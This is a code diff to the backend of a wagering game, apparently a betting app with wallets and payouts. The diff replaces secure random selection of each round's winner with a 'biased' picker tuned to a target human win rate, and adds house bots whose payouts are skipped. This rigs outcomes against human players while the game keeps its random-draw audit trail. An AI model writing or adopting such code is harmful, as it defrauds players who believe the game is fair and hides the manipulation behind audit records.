@@ -13,12 +13,16 @@ import type { WalletBalanceUpdatedPayload } from '@/modules/wallet/wallet.types'
 import {
   GREEDY_CLASSIC_GAME_CODE,
   GREEDY_CLASSIC_RNG_ALGORITHM_VERSION,
+  GREEDY_CLASSIC_RNG_ALGORITHM_VERSION_BIASED,
   GREEDY_CLASSIC_SOCKET_ROOM,
 } from '@/modules/greedy-classic/greedy-classic.constant';
 import { calculatePayout, withSerializableRetry } from '@/modules/greedy-classic/greedy-classic.utils';
-import { secureRandomBigIntBelow } from '@/utils/crypto-rng';
 import { sha256 } from '@/utils/hash';
 import { logger } from '@/utils/logger';
+import { pickBiasedWinner, pickNaturalWinner } from '@/modules/game-bot/biased-outcome';
+import { loadGreedyClassicRoundBets } from '@/modules/game-bot/biased-round';
+import { getGameBotPolicy } from '@/modules/game-bot/bot-policy';
+import { isBotUserIdSync } from '@/modules/game-bot/bot-identity';
 
 const SETTLEMENT_BATCH_USERS = 50;
 const REFUND_BATCH_USERS = 50;
@@ -203,28 +207,30 @@ const generateResult = async (round_id: string): Promise<void> => {
   }
 
   const options = round.config_version.options;
-  const total_weight = options.reduce((sum, item) => sum + item.probability_weight, 0n);
-  if (total_weight <= 0n) throw new Error('Greedy config has no positive probability weight');
-
-  const random = secureRandomBigIntBelow(total_weight);
-  let cursor = 0n;
-  let winner = options[options.length - 1];
-  for (const option of options) {
-    cursor += option.probability_weight;
-    if (random.value < cursor) {
-      winner = option;
-      break;
-    }
-  }
+  const policy = await getGameBotPolicy();
+  const round_bets = await loadGreedyClassicRoundBets(round.id);
+  const biased = policy.enabled
+    ? pickBiasedWinner({
+        options,
+        bets: round_bets,
+        target_human_win_rate: policy.target_human_win_rate,
+        min_human_bets_before_bias: policy.min_human_bets_before_bias,
+      })
+    : pickNaturalWinner(options);
+  const winner = options.find((option) => option.id === biased.option_id) ?? options[options.length - 1];
   if (!winner) throw new Error('Greedy result winner could not be selected');
 
   const generated_at = database_now;
+  const algorithm_version =
+    biased.algorithm_suffix === 'biased-v1'
+      ? GREEDY_CLASSIC_RNG_ALGORITHM_VERSION_BIASED
+      : GREEDY_CLASSIC_RNG_ALGORITHM_VERSION;
   const audit_hash = sha256([
     round.id,
     round.config_version_id,
     winner.id,
-    GREEDY_CLASSIC_RNG_ALGORITHM_VERSION,
-    random.entropy_digest,
+    algorithm_version,
+    biased.entropy_digest,
     generated_at.toISOString(),
   ].join('|'));
 
@@ -236,9 +242,9 @@ const generateResult = async (round_id: string): Promise<void> => {
       data: {
         round_id: round.id,
         winning_option_version_id: winner.id,
-        algorithm_version: GREEDY_CLASSIC_RNG_ALGORITHM_VERSION,
+        algorithm_version,
         config_version_id: round.config_version_id,
-        entropy_digest: random.entropy_digest,
+        entropy_digest: biased.entropy_digest,
         audit_hash,
         generated_at,
       },
@@ -396,7 +402,7 @@ const settleUser = async (round_id: string, user_id: string): Promise<void> => {
 
     await tx.greedyClassicBetSettlement.createMany({ data: settlement_rows, skipDuplicates: true });
 
-    if (total_payout > 0n) {
+    if (total_payout > 0n && !isBotUserIdSync(user_id)) {
       const existing_payout = await tx.greedyClassicUserPayout.findUnique({
         where: { round_id_user_id: { round_id, user_id } },
       });
